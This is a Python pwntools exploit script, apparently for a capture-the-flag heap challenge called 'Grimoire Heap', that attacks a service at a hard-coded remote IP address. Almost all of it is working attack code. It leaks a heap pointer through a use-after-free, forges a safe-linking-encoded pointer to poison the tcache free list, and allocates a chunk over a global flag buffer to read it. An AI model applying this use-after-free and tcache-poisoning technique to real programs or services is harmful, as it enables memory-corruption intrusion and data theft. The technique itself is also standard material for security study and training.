#!/usr/bin/env python3
"""
Grimoire Heap - Fixed tcache poisoning
Key: ensure spells are at DIFFERENT addresses before double-banish
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=3)
        if not chunk:
            break
        data += chunk
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')
log.info("Connected")

# Step 1: Create spell 0
log.info("Creating spell 0")
create(p, 0, 0x80, b'A' * 0x10 + b'\n')

# Step 2: Banish spell 0
log.info("Banishing spell 0")
banish(p, 0)

# Step 3: Read spell 0 UAF to get its address
data = recite(p, 0, 0x80)
fd0 = u64(data[0:8])
spell0_addr = fd0 << 12  # X
log.info(f"spell0 (X) = {hex(spell0_addr)}")

# Step 4: Create spell 1 - reuses X from tcache
log.info("Creating spell 1 (reuses X)")
create(p, 1, 0x80, b'B' * 0x10 + b'\n')

# Step 5: Create spell 2 - new address X+0x90
log.info("Creating spell 2 (new addr X+0x90)")
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Step 6: Banish spell 1 (at X) and spell 2 (at X+0x90)
# tcache: [X+0x90 -> X]
log.info("Banishing spell 1 and 2")
banish(p, 1)
banish(p, 2)

# Step 7: Read spell 2 UAF (head of tcache)
data = recite(p, 2, 0x80)
fd2 = u64(data[0:8])
log.info(f"spell2 fd = {hex(fd2)}")
# fd2 = ((X+0x90) >> 12) ^ X
# (X+0x90) >> 12 = X >> 12 (since 0x90 < 0x1000, assuming X is page-aligned)
# So fd2 = (X >> 12) ^ X
# We already know X >> 12 = fd0
# So fd2 should equal fd0 ^ X
expected_fd2 = fd0 ^ spell0_addr
log.info(f"expected fd2 = {hex(expected_fd2)}")
log.info(f"matches: {fd2 == expected_fd2}")

# Step 8: Calculate g_flag address
# g_flag is at X - 0x90
g_flag_addr = spell0_addr - 0x90
log.info(f"g_flag_addr (guess: offset 0x90) = {hex(g_flag_addr)}")

# Step 9: Calculate protected value
# spell2->fd should be: ((X+0x90) >> 12) ^ g_flag_addr
protected = (spell0_addr >> 12) ^ g_flag_addr
log.info(f"protected = {hex(protected)}")

# Step 10: Edit spell 2 to overwrite fd
log.info("Poisoning tcache via edit on spell 2")
payload = p64(protected) + b'\x00' * (0x80 - 8)
edit(p, 2, 0x80, payload)

# Step 11: Create spell 3 - returns X+0x90
log.info("Creating spell 3 (returns X+0x90)")
create(p, 3, 0x80, b'D' * 0x10 + b'\n')

# Step 12: Create spell 4 - should return g_flag!
log.info("Creating spell 4 (should return g_flag)")
create(p, 4, 0x80, b'\n')

# Step 13: Read spell 4
log.info("Reading spell 4")
data = recite(p, 4, 0x80)
log.info(f"data hex: {data[:64].hex()}")
try:
    text = data[:0x80].decode('latin-1')
    log.info(f"data text: {text[:200]}")
except:
    pass

# Check for flag
if b'flag' in data.lower() or b'CTF' in data or b'{' in data:
    log.success(f"FOUND FLAG-LIKE DATA!")
    # Find the flag
    for i, b in enumerate(data):
        if 32 <= b < 127:
            pass
    # Print all printable runs
    import re
    for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
        log.success(f"String: {m.group()}")

p.sendline(b'0')
p.close()
